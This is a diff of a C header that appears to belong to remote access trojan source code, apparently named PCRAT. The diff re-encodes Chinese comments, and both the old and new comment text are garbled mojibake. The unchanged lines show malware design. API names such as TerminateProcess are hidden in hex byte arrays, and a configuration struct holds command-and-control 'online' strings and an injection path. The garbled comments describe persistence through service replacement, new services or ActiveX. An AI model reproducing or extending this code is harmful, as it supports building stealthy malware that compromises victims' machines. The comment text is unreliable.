@@ -1,4 +1,4 @@
-ï»¿//ä¸»è¦æŠŠåŠ¨æ€è°ƒç”¨çš„å‡½æ•°æ”¾åˆ°è¿™é‡Œ 
+//Ö÷Òª°Ñ¶¯Ì¬µ÷ÓÃµÄº¯Êı·Åµ½ÕâÀï 
 #ifndef   DYNAMICAPI 
   #define    DYNAMICAPI
 #include <wininet.h>
@@ -179,25 +179,25 @@ typedef struct
 			char ch[]={0x54,  0x65,  0x72,  0x6D,  0x69,  0x6E,  0x61,  0x74,  0x65,  0x50,  0x72,  0x6F,  0x63,  0x65,  0x73,  0x73,  0};
 			pTerminateProcessT=(TerminateProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),ch);
 	  }
-	  void init_replace(char* Dllname){                 //æ›¿æ¢æœåŠ¡ç”¨
+	  void init_replace(char* Dllname){                 //Ìæ»»·şÎñÓÃ
 	  
 	    pServiceMainT=(ServiceMainT)GetProcAddress(LoadLibrary(Dllname),"ServiceMain");
 	  }
 }DynamicAPI;
 
-//å¤„äºä½•ç§å¯åŠ¨æ–¹å¼
+//´¦ÓÚºÎÖÖÆô¶¯·½Ê½
 struct  PCRATSTACT
 {
-	char stact[11];    //æ ‡å¿—
-	BYTE how;          //1 æ›¿æ¢æœåŠ¡ 2 æ–°æ·»æœåŠ¡  3 ActiveXå®‰è£… 4ActiveXå¯åŠ¨
-	char NUM[64];     //ActiveX  å¯åŠ¨æ ‡å¿—ï¼Œ æœåŠ¡å¯åŠ¨æ—¶ä¿å­˜æœåŠ¡å
-	char strDNS[MAX_PATH];          //ä¸Šçº¿å­—ä¸² ä»¥å‰çš„BKLANG
-	char strDNS2[MAX_PATH];         //å¤‡ç”¨çš„ä¸Šçº¿å­—ä¸²ä»¥å‰çš„VSLANG
+	char stact[11];    //±êÖ¾
+	BYTE how;          //1 Ìæ»»·şÎñ 2 ĞÂÌí·şÎñ  3 ActiveX°²×° 4ActiveXÆô¶¯
+	char NUM[64];     //ActiveX  Æô¶¯±êÖ¾£¬ ·şÎñÆô¶¯Ê±±£´æ·şÎñÃû
+	char strDNS[MAX_PATH];          //ÉÏÏß×Ö´® ÒÔÇ°µÄBKLANG
+	char strDNS2[MAX_PATH];         //±¸ÓÃµÄÉÏÏß×Ö´®ÒÔÇ°µÄVSLANG
 	char strInject[MAX_PATH];
 };
 struct MYEVENT
 {
-	HANDLE DelAlontEvent;           //ä¿æŠ¤çº¿ç¨‹é€€å‡º
-	HANDLE UnstallEvent;           //å¸è½½å‘ä¸‹ç»§ç»­è¿›è¡Œ
+	HANDLE DelAlontEvent;           //±£»¤Ïß³ÌÍË³ö
+	HANDLE UnstallEvent;           //Ğ¶ÔØÏòÏÂ¼ÌĞø½øĞĞ
 };
 #endif
